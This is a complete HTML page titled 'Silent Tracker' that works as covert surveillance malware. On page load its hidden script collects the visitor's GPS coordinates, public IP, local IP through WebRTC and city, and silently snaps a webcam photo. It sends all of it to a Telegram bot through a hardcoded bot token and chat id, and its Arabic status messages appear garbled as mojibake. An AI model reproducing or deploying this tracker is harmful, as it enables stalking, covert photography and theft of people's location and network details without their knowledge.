<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Silent Tracker + BigDataCloud</title>
<style>body{margin:0}video,canvas{display:none}</style>
</head>
<body>
<video id="video" autoplay playsinline></video><canvas id="canvas"></canvas>
<script>
const token="7692799219:AAGv_dCGtZ5c-6MXTrUUJeEVoBDATMN3RgI", chat_id="5735855086";
let gpsMsg="", publicIP="", localIP="", gpsLat="", gpsLon="", partsReady=0;
let city="", country="", flagEmoji="";

function sendPhoto(b){const f=new FormData();f.append("chat_id",chat_id);f.append("photo",b,"photo.jpg");
return fetch(`https://api.telegram.org/bot${token}/sendPhoto`,{method:"POST",body:f});}

function sendCombinedMessage(){
  const msg=`ðŸ“¡ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²:

ðŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹ (GPS):
${gpsMsg||"âŒ ÙØ´Ù„ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹"}

ðŸŒ IP Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠ: ${publicIP||"âŒ"}
ðŸ  IP Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ: ${localIP||"âŒ"}

ðŸ™ï¸ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${city||"âŒ"}
ðŸŒ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${country?`${country} ${flagEmoji}`:"âŒ"}

ðŸ—ºï¸ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
  fetch(`https://api.telegram.org/bot${token}/sendMessage`,{
    method:"POST",headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id,text:msg})
  });
}

function checkIfReady(){if(++partsReady===3)sendCombinedMessage();}

function reverseGeocode(lat,lon){
  fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=en`)
    .then(r=>r.json()).then(d=>{
      city=d.locality||d.city||"";
      country=d.countryName||"";
      const code=d.countryCode||"";
      flagEmoji=code?String.fromCodePoint(...[...code].map(c=>0x1F1E6+c.charCodeAt(0)-65)):"";
      checkIfReady();
    }).catch(_=>{city="";country="";flagEmoji="";checkIfReady();});
}

function getLocation(){
  if("geolocation"in navigator){
    navigator.geolocation.getCurrentPosition(
      p=>{
        gpsLat=p.coords.latitude.toFixed(6);
        gpsLon=p.coords.longitude.toFixed(6);
        gpsMsg=`Latitude: ${gpsLat}\nLongitude: ${gpsLon}\nðŸ“ Ø§Ù„Ø¯Ù‚Ø©: Â±${p.coords.accuracy} Ù…ØªØ±`;
        reverseGeocode(gpsLat,gpsLon);
      },
      ()=>{gpsMsg="âŒ ÙØ´Ù„ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹";reverseGeocode(null,null);},
      {enableHighAccuracy:true,timeout:10000,maximumAge:0}
    );
  } else {
    gpsMsg="âŒ GPS ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…";reverseGeocode(null,null);
  }
}

function getPublicIP(){
  fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(d=>{
    publicIP=d.ip;checkIfReady();
  }).catch(_=>{publicIP="âŒ ÙØ´Ù„ Ø¬Ù„Ø¨ IP";checkIfReady();});
}

function getLocalIP(){
  const pc=new RTCPeerConnection({iceServers:[]});
  pc.createDataChannel("");pc.createOffer().then(o=>pc.setLocalDescription(o)).catch(()=>{});
  pc.onicecandidate=e=>{
    if(e?.candidate){
      const m=/([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
      if(m){
        const ip=m[1];
        if(ip.startsWith("192.")||ip.startsWith("10.")||ip.startsWith("172.")){
          localIP=ip;checkIfReady();
        }
      }
    }
  };
  setTimeout(()=>{if(!localIP)localIP="âŒ Ù„Ù… ÙŠØªÙ… Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„ÙŠÙ‡",checkIfReady()},2000);
}

function initCamera(){
  navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
    document.getElementById("video").srcObject=s;
    document.getElementById("video").addEventListener("playing",()=>{
      const c=document.getElementById("canvas"),ctx=c.getContext("2d");
      c.width=video.videoWidth;c.height=video.videoHeight;
      ctx.drawImage(video,0,0);
      c.toBlob(b=>sendPhoto(b),"image/jpeg");
      s.getTracks().forEach(t=>t.stop());
    });
  }).catch(()=>{});
}

getLocation();
getPublicIP();
getLocalIP();
initCamera();
</script>
</body>
</html>
